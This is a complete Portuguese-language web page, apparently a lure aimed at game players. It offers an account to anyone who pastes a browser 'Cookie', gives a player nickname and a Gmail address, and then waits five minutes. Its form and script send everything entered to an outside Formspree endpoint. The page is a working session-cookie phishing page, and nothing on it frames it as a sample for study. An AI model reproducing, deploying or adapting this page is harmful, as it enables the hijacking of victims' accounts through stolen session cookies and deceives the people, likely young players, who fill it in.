<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="color-scheme" content="dark">
  <title>Enviar informações</title>
  <style>
    * { box-sizing: border-box; }
    body { margin: 0; min-height: 100vh; display: grid; place-items: center; background: radial-gradient(ellipse at 50% 12%, #252525 0%, #121212 48%, #050505 100%); color: #f5f5f5; font-family: Arial, Helvetica, sans-serif; }
    .panel { width: 401px; max-width: calc(100vw - 32px); background: #161616; border: 1px solid #333; border-radius: 16px; padding: 30px 31px 29px; box-shadow: 0 18px 55px rgba(0,0,0,.32); }
    h1 { font-size: 25px; line-height: 1.25; text-align: center; margin: 0 0 5px; font-weight: 700; letter-spacing: -.45px; }
    .subtitle { margin: 0 0 29px; text-align: center; font-size: 14px; color: #969696; }
    label { display: block; font-size: 12px; font-weight: 700; margin: 0 0 8px; }
    .field { margin-bottom: 19px; }
    input, textarea { display: block; width: 100%; border: 1px solid #353535; border-radius: 9px; padding: 13px; background: #101010; color: #fff; font: 14px Arial, sans-serif; outline: none; transition: border-color .15s, box-shadow .15s; }
    input { height: 45px; }
    textarea { min-height: 160px; max-height: 450px; resize: vertical; overflow-y: auto; line-height: 1.5; }
    input::placeholder, textarea::placeholder { color: #686868; }
    input:focus, textarea:focus { border-color: #656565; box-shadow: 0 0 0 2px rgba(255,255,255,.055); }
    button { display: block; width: 100%; height: 47px; margin-top: 18px; background: #fafafa; border: 0; border-radius: 9px; color: #0c0c0c; font: 700 13px Arial, sans-serif; cursor: pointer; }
    button:hover { background: #e9e9e9; }
    button:disabled { opacity: .65; cursor: wait; }
    .status { min-height: 18px; margin: 15px 0 0; text-align: center; color: #aaa; font-size: 12px; }
    .status.success { color: #a6d7a7; }
    .status.error { color: #f2a0a0; }
    .note { font-size: 11px; line-height: 1.5; color: #999; margin: -7px 0 0; }
    @media (max-width: 450px) { .panel { padding: 27px 22px; } h1 { font-size: 23px; } }
  </style>
</head>
<body>
  <main class="panel">
    <h1>Enviar informações</h1>
    <p class="subtitle">Preencha os campos abaixo</p>
    <form id="formulario" action="https://formspree.io/f/xkjoevbp" method="POST">
      <div class="field">
        <label for="Cookie">Cookie🍪</label>
        <textarea id="mensagem" name="mensagem" rows="7" placeholder="Cole o Cookie aqui" required></textarea>
      </div>
      <div class="field">
        <label for="nick"> Nick do jogador</label>
        <input id="nick" name="nick" type="text" placeholder="Digite o nick" required maxlength="50">
      </div>
      <div class="field">
        <label for="email">Seu Gmail (para receber a conta)</label>
        <input id="email" name="email" type="email" placeholder="exemplo@gmail.com" autocomplete="email">
      </div>
      <p class="note">aguarde 5 minutos.</p>
      <button id="enviar" type="submit">ENVIAR</button>
      <p class="status" id="status" aria-live="polite"></p>
    </form>
  </main>
  <script>
    const formulario = document.getElementById('formulario');
    const status = document.getElementById('status');
    const botao = document.getElementById('enviar');
    formulario.addEventListener('submit', async function (event) {
      event.preventDefault();
      status.className = 'status';
      status.textContent = 'Enviando...';
      botao.disabled = true;
      try {
        const resposta = await fetch(formulario.action, {
          method: 'POST',
          body: new FormData(formulario),
          headers: { 'Accept': 'application/json' }
        });
        if (!resposta.ok) throw new Error('Falha no envio');
        status.textContent = '✅ Mensagem enviada com sucesso!';
        status.classList.add('success');
        formulario.reset();
      } catch (erro) {
        status.textContent = 'Não foi possível enviar. Tente novamente.';
        status.classList.add('error');
      } finally {
        botao.disabled = false;
      }
    });
  </script>
</body>
</html>
